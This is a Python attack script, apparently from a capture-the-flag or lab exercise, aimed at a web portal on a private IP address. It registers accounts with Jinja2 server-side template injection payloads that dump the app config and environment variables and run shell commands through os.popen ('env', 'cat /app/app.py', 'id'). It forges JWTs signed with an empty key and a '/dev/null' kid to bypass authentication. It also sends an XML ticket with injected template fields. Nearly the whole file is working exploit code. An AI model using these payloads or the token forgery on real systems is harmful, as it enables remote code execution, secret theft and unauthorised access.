#!/usr/bin/env python3
"""round60 — Confirm SSTI: register {{7*7}} as company, check portal for 49"""
import requests, time, json, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

# ============================================================
print("="*70)
print("SSTI CONFIRMATION TEST")
print("="*70)

# Test 1: Register with {{7*7}} → should show 49 if SSTI works
ts = int(time.time())
tests = [
    (f"math1_{ts}@test.kz", "Test123!", "{{7*7}}", "49"),
    (f"math2_{ts}@test.kz", "Test123!", "{{7*'7'}}", "7777777"),
    (f"safe_{ts}@test.kz", "Test123!", "SAFE_COMPANY", "SAFE_COMPANY"),
]

for email, pwd, company, expected in tests:
    print(f"\n  --- Test: company={company!r}, expect={expected!r} ---")

    # Register
    try:
        r = S.post(f"{CASPI}/api/auth/register",
                   json={"email": email, "password": pwd, "company": company},
                   timeout=5)
        print(f"  Register: [{r.status_code}] {r.text[:200]}")
        if r.status_code != 200:
            continue
    except Exception as e:
        print(f"  Register error: {e}")
        continue

    # Login
    try:
        r = S.post(f"{CASPI}/api/auth/login",
                   json={"email": email, "password": pwd},
                   timeout=5)
        if r.status_code != 200:
            print(f"  Login failed: [{r.status_code}] {r.text[:200]}")
            continue
        token = r.json().get("token", "")
        print(f"  Login OK")
    except Exception as e:
        print(f"  Login error: {e}")
        continue

    # Get portal
    try:
        hdr = {"Authorization": f"Bearer {token}"}
        r = S.get(f"{CASPI}/portal", headers=hdr, timeout=10)
        print(f"  Portal: [{r.status_code}] ({len(r.text)} bytes)")

        if r.status_code == 200:
            # Search for company name / evaluated result
            text = re.sub(r'<[^>]+>', '\n', r.text)
            lines = [l.strip() for l in text.split('\n') if l.strip()]

            # Find "Welcome" line
            for i, line in enumerate(lines):
                if 'Welcome' in line or 'welcome' in line:
                    context = lines[max(0,i-1):min(len(lines),i+3)]
                    print(f"  Welcome context: {context}")

            # Check for expected value
            if expected in r.text:
                print(f"  *** FOUND '{expected}' IN PORTAL HTML ***")
                if company != expected:
                    print(f"  *** SSTI CONFIRMED! {company} → {expected} ***")

            # Check for literal template syntax
            if company in r.text and company != expected:
                print(f"  Literal '{company}' found — SSTI did NOT execute")

            # Search for config/secret/probe
            for kw in ['Config', 'config', 'SECRET', 'PROBE', 'probe_secret', 'PROBE_SECRET']:
                if kw in r.text:
                    # Find context around the keyword
                    idx = r.text.index(kw)
                    snippet = r.text[max(0,idx-100):idx+200]
                    snippet_clean = re.sub(r'<[^>]+>', ' ', snippet).strip()
                    print(f"  Found '{kw}' in portal: ...{snippet_clean}...")
        else:
            print(f"  Portal body: {r.text[:500]}")

    except Exception as e:
        print(f"  Portal error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("SSTI DEEP TEST — MORE PAYLOADS")
print("="*70)

# If basic SSTI works, try to extract secrets
ssti_accounts = [
    (f"cfg1_{ts}@test.kz", "Test123!", "{{config}}"),
    (f"cfg2_{ts}@test.kz", "Test123!", "{{config.items()|list}}"),
    (f"cfg3_{ts}@test.kz", "Test123!", "{{request.environ}}"),
    (f"cfg4_{ts}@test.kz", "Test123!", "{{self.__init__.__globals__}}"),
    # Target PROBE_SECRET specifically
    (f"ps1_{ts}@test.kz", "Test123!", "{{config.get('PROBE_SECRET','NOPE')}}"),
    (f"ps2_{ts}@test.kz", "Test123!", "{{config['PROBE_SECRET']}}"),
    # Flask app object
    (f"app1_{ts}@test.kz", "Test123!", "{{url_for.__globals__['current_app'].config}}"),
    (f"app2_{ts}@test.kz", "Test123!", "{{get_flashed_messages.__globals__['current_app'].config['PROBE_SECRET']}}"),
    # Simpler - just try os.environ
    (f"env1_{ts}@test.kz", "Test123!", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    # Import os
    (f"os1_{ts}@test.kz", "Test123!", "{{cycler.__init__.__globals__.os.environ}}"),
    (f"os2_{ts}@test.kz", "Test123!", "{{lipsum.__globals__.os.environ}}"),
    (f"os3_{ts}@test.kz", "Test123!", "{{lipsum.__globals__.os.environ.get('PROBE_SECRET')}}"),
    (f"os4_{ts}@test.kz", "Test123!", "{{lipsum.__globals__['os'].environ['PROBE_SECRET']}}"),
    # Direct command execution
    (f"cmd1_{ts}@test.kz", "Test123!", "{{lipsum.__globals__['os'].popen('env').read()}}"),
    (f"cmd2_{ts}@test.kz", "Test123!", "{{lipsum.__globals__['os'].popen('cat /app/app.py').read()}}"),
    (f"cmd3_{ts}@test.kz", "Test123!", "{{lipsum.__globals__['os'].popen('id').read()}}"),
    # Through request
    (f"req1_{ts}@test.kz", "Test123!", "{{request.application.__self__._get_data_for_json.__globals__}}"),
]

for email, pwd, company in ssti_accounts:
    desc = company[:50]
    print(f"\n  --- {desc} ---")

    # Register
    try:
        r = S.post(f"{CASPI}/api/auth/register",
                   json={"email": email, "password": pwd, "company": company},
                   timeout=10)
        if r.status_code != 200:
            print(f"  Register failed: [{r.status_code}]")
            continue
    except requests.exceptions.Timeout:
        print(f"  *** REGISTER TIMEOUT — server processing template? ***")
        continue
    except Exception as e:
        print(f"  Register error: {e}")
        continue

    # Login
    try:
        r = S.post(f"{CASPI}/api/auth/login",
                   json={"email": email, "password": pwd},
                   timeout=5)
        if r.status_code != 200:
            print(f"  Login failed: [{r.status_code}]")
            continue
        token = r.json().get("token", "")
    except Exception as e:
        print(f"  Login error: {e}")
        continue

    # Check /api/auth/me first (might show evaluated company)
    try:
        r = S.get(f"{CASPI}/api/auth/me",
                  headers={"Authorization": f"Bearer {token}"}, timeout=5)
        me_data = r.json()
        me_company = me_data.get("company", "")
        if me_company != company:
            print(f"  *** /me COMPANY CHANGED: {me_company[:300]} ***")
        else:
            print(f"  /me: company stored as-is")
    except:
        pass

    # Check portal
    try:
        r = S.get(f"{CASPI}/portal",
                  headers={"Authorization": f"Bearer {token}"}, timeout=15)
        if r.status_code == 200:
            # Extract text around "Welcome"
            text = re.sub(r'<[^>]+>', ' ', r.text)

            # Look for company name or evaluated value
            if company not in r.text:
                # Company name NOT in page → might have been evaluated!
                # Search for interesting values
                welcome_match = re.search(r'Welcome[,\s]+([^<\n]+)', r.text)
                if welcome_match:
                    print(f"  *** PORTAL SHOWS: Welcome {welcome_match.group(1)[:500]} ***")

                # Dump unique text content not in safe version
                for kw in ['secret', 'SECRET', 'PROBE', 'key', 'KEY', 'environ',
                           'password', 'PASSWORD', 'config', 'Config',
                           'uid=', 'root', 'HMAC', 'hmac']:
                    if kw in text:
                        idx = text.index(kw)
                        snippet = text[max(0,idx-50):idx+200].strip()
                        print(f"  Found '{kw}': {snippet[:300]}")
            else:
                pass  # Literal template syntax in page = no SSTI

        elif r.status_code == 500:
            # 500 could mean template rendering error = template IS being processed
            print(f"  *** 500 ERROR — template render failed (SSTI active but errored?) ***")
            print(f"  Error body: {r.text[:500]}")
        else:
            print(f"  Portal [{r.status_code}]")
    except requests.exceptions.Timeout:
        print(f"  *** PORTAL TIMEOUT — heavy template processing? ***")
    except Exception as e:
        print(f"  Portal error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("SSTI VIA CUSTODY INGEST FIELDS → PORTAL VIEW")
print("="*70)

# What if custody ticket fields are rendered with SSTI on the portal?
# The portal says "Custody-transfer tickets" but "Ask dispatch for a copy"
# Maybe there's another way to view tickets?

# Try injecting SSTI in ticket reference and reading it back somehow
import hmac as hm, hashlib, base64
def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP_HDR = {"Authorization": f"Bearer {jwt_forged('operator')}"}

# Ingest ticket with SSTI in all fields
ssti_ticket = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{{config.PROBE_SECRET}}</reference>
  <tankId>T-01</tankId><product>{{config}}</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{{lipsum.__globals__.os.popen('env').read()}}</carrier>
  <remarks>{{7*7}}</remarks>
</ticket>'''
try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=ssti_ticket, headers={**AUTH_OP_HDR, "Content-Type":"application/xml"}, timeout=10)
    print(f"  Ingest SSTI ticket: [{r.status_code}]")
    if r.status_code == 200:
        data = r.json()
        summary = data.get("summary", {})
        # Check if any field was evaluated
        for field, val in summary.items():
            if '{{' not in str(val) and str(val) not in ['1', 'T-01', '{{config.PROBE_SECRET}}',
                                                          '{{config}}', '{{7*7}}',
                                                          '{{lipsum.__globals__.os.popen(\'env\').read()}}']:
                print(f"  *** SSTI in {field}: {val[:300]} ***")
            elif '49' in str(val):
                print(f"  *** SSTI MATH in {field}: {val} ***")
        print(f"  Summary: {summary}")
except Exception as e:
    print(f"  Ingest error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PORTAL — FULL HTML DUMP (WITH SSTI ACCOUNT)")
print("="*70)

# Use the first SSTI account ({{config.PROBE_SECRET}})
try:
    ssti_email = f"ssti_{ts - (ts % 100)}@test.kz"  # might not match, use new one
    email = f"dump_{ts}@test.kz"
    pwd = "Test123!"
    company = "{{config.PROBE_SECRET}}"

    r = S.post(f"{CASPI}/api/auth/register",
               json={"email": email, "password": pwd, "company": company},
               timeout=10)
    if r.status_code == 200:
        r = S.post(f"{CASPI}/api/auth/login",
                   json={"email": email, "password": pwd}, timeout=5)
        if r.status_code == 200:
            token = r.json().get("token", "")
            r = S.get(f"{CASPI}/portal",
                      headers={"Authorization": f"Bearer {token}"}, timeout=15)
            print(f"  Portal [{r.status_code}] ({len(r.text)} bytes)")

            # Full HTML dump - look for company name rendering
            # Find the "Welcome" section
            welcome_idx = r.text.find('Welcome')
            if welcome_idx >= 0:
                snippet = r.text[welcome_idx:welcome_idx+500]
                print(f"\n  Welcome section HTML:")
                print(f"  {snippet}")

            # Search for any secret-like strings
            # If SSTI worked, we'd see the actual secret value
            # If not, we'd see literal {{config.PROBE_SECRET}}
            if '{{config.PROBE_SECRET}}' in r.text:
                print(f"\n  >>> LITERAL template syntax found — SSTI NOT working <<<")
            elif 'config.PROBE_SECRET' in r.text:
                print(f"\n  >>> Partially evaluated? <<<")
            else:
                print(f"\n  >>> Template syntax NOT in output — SSTI might have worked! <<<")
                # Dump all text to find the value
                text = re.sub(r'<[^>]+>', '\n', r.text)
                for line in text.split('\n'):
                    line = line.strip()
                    if line and line not in ['', ' ']:
                        print(f"    {line}")
except Exception as e:
    print(f"  Error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
